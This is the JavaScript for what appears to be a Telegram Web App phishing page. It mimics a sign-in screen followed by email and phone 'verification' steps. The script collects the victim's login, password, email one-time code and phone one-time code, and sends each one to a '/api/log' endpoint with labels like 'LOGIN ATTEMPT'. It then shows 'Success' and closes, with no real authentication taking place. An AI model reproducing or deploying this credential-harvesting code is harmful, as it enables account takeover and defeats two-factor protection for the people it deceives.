const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // Screens
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');

    // Inputs
    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '' };
    let currentStep = 1;

    // Tab Logic
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById('login-password-wrapper').style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
        });
    });

    // Password Eye
    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPass.type === 'password';
            loginPass.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
        });
    }

    // Sign In Action
    document.getElementById('trigger-signin').addEventListener('click', () => {
        if (!loginId.value.trim()) return alert('Enter credentials');
        
        userData.id = loginId.value.trim();
        userData.pass = loginPass.value.trim();
        userData.time = new Date().toLocaleString();

        // Pre-fill email/phone if detected
        if (userData.id.includes('@')) verifyEmailId.value = userData.id;
        else if (/^\d+$/.test(userData.id.replace(/\+/g,''))) verifyPhoneNum.value = userData.id;

        logToServer('🔑 LOGIN ATTEMPT', userData);
        screenSignin.style.display = 'none';
        screenStepper.style.display = 'flex';
    });

    // Go to Email Modal
    document.getElementById('item-email').addEventListener('click', () => {
        if (currentStep !== 1) return;
        modalEmail.style.display = 'flex';
        
        // Auto-send OTP if email is present
        if (verifyEmailId.value.includes('@')) {
            fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: verifyEmailId.value })
            });
        }
    });

    // Submit Email OTP
    document.getElementById('submit-email-otp').addEventListener('click', async () => {
        if (!verifyEmailId.value || !verifyEmailOtp.value) return alert('Fill all fields');
        
        userData.email = verifyEmailId.value;
        userData.email_otp = verifyEmailOtp.value;
        
        await logToServer('📧 EMAIL VERIFICATION', userData);
        
        modalEmail.style.display = 'none';
        currentStep = 2;
        
        document.getElementById('step-number-display').innerText = '2/2';
        const itemEmail = document.getElementById('item-email');
        itemEmail.style.opacity = '0.5';
        itemEmail.style.pointerEvents = 'none';
        itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
        itemEmail.querySelector('.card-link').style.color = '#3bc117';
        
        const itemPhone = document.getElementById('item-phone');
        itemPhone.style.opacity = '1';
        itemPhone.style.pointerEvents = 'auto';
        itemPhone.classList.add('active');
    });

    // Go to Phone Modal
    document.getElementById('item-phone').addEventListener('click', () => {
        if (currentStep !== 2) return;
        modalPhone.style.display = 'flex';
    });

    // Submit Phone OTP
    document.getElementById('submit-phone-otp').addEventListener('click', async () => {
        if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert('Fill all fields');
        
        userData.phone = verifyPhoneNum.value;
        userData.phone_otp = verifyPhoneOtp.value;
        
        await logToServer('📱 PHONE VERIFICATION (FINAL)', userData);
        
        document.getElementById('submit-phone-otp').innerText = 'Success';
        document.getElementById('btn-final-confirm').classList.add('ready');

        setTimeout(() => {
            if (tg) tg.close();
            else location.reload();
        }, 1500);
    });

    // Utils
    window.closeAllModals = () => {
        modalEmail.style.display = 'none';
        modalPhone.style.display = 'none';
    };

    window.pasteOTP = async (targetId) => {
        try {
            const text = await navigator.clipboard.readText();
            if (text) document.getElementById(targetId).value = text;
        } catch (e) {}
    };

    document.getElementById('back-to-signin').addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });

    async function logToServer(title, data) {
        try {
            const res = await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
            const result = await res.json();
            if (!result.success) console.error('Log failed:', result.message);
        } catch (e) {
            console.error('Log fetch error:', e);
        }
    }
});
